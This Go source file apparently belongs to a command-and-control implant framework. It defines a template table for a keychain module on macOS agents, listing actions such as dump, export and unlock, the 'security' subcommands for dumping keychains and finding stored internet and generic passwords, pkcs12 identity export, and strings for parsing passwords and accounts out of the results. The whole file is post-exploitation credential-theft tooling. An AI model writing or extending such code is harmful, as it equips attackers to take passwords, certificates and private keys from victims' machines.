// internal/templates/keychain.go
package templates

// GetKeychainTemplate returns the keychain command template for Darwin agents
func GetKeychainTemplate() *CommandTemplate {
	tpl := make([]string, MaxTemplateSize)

	// Actions
	tpl[IdxKcList] = "list"
	tpl[IdxKcDump] = "dump"
	tpl[IdxKcSearch] = "search"
	tpl[IdxKcAdd] = "add"
	tpl[IdxKcDelete] = "delete"
	tpl[IdxKcExport] = "export"
	tpl[IdxKcUnlock] = "unlock"

	// Flags (short form - server transforms long flags)
	tpl[IdxKcFlagKeychain] = "-k"
	tpl[IdxKcFlagService] = "-s"
	tpl[IdxKcFlagAccount] = "-a"
	tpl[IdxKcFlagLabel] = "-l"
	tpl[IdxKcFlagPassword] = "-p"
	tpl[IdxKcFlagOutput] = "-o"

	// Parsing strings
	tpl[IdxKcPKeychain] = "keychain:"
	tpl[IdxKcPData] = "data:"
	tpl[IdxKcPPassword] = "password:"
	tpl[IdxKcPAcct] = "\"acct\""
	tpl[IdxKcPSvce] = "\"svce\""
	tpl[IdxKcPDesc] = "\"desc\""
	tpl[IdxKcPLabl] = "labl"
	tpl[IdxKcPSubj] = "subj"

	// Security tool and subcommands
	tpl[IdxKcSecurity] = "security"
	tpl[IdxKcListKeychains] = "list-keychains"
	tpl[IdxKcDefaultKeychain] = "default-keychain"
	tpl[IdxKcDumpKeychain] = "dump-keychain"
	tpl[IdxKcFindInternetPwd] = "find-internet-password"
	tpl[IdxKcFindCertificate] = "find-certificate"
	tpl[IdxKcFindGenericPwd] = "find-generic-password"
	tpl[IdxKcAddGenericPwd] = "add-generic-password"
	tpl[IdxKcDeleteGenericPwd] = "delete-generic-password"
	tpl[IdxKcSecExport] = "export"
	tpl[IdxKcUnlockKeychain] = "unlock-keychain"

	// Path strings
	tpl[IdxKcLibrary] = "Library"
	tpl[IdxKcKeychains] = "Keychains"
	tpl[IdxKcKcStr] = "keychain"

	// Export format strings
	tpl[IdxKcIdentities] = "identities"
	tpl[IdxKcPkcs12] = "pkcs12"

	// Map key strings
	tpl[IdxKcMKeychain] = "keychain"
	tpl[IdxKcMAccount] = "account"
	tpl[IdxKcMService] = "service"
	tpl[IdxKcMDescription] = "description"
	tpl[IdxKcMData] = "data"
	tpl[IdxKcMPassword] = "password"

	return &CommandTemplate{
		Version:   2,
		Type:      TypeKeychain,
		Templates: tpl,
		Params:    []string{},
	}
}

// TransformKeychainFlags transforms long flags to short flags for keychain command
func TransformKeychainFlags(command string) string {
	replacements := []struct{ from, to string }{
		{" --keychain ", " -k "},
		{" --service ", " -s "},
		{" --account ", " -a "},
		{" --label ", " -l "},
		{" --password ", " -p "},
		{" --output ", " -o "},
	}

	result := command
	for _, r := range replacements {
		result = replaceAllOccurrences(result, r.from, r.to)
	}
	return result
}
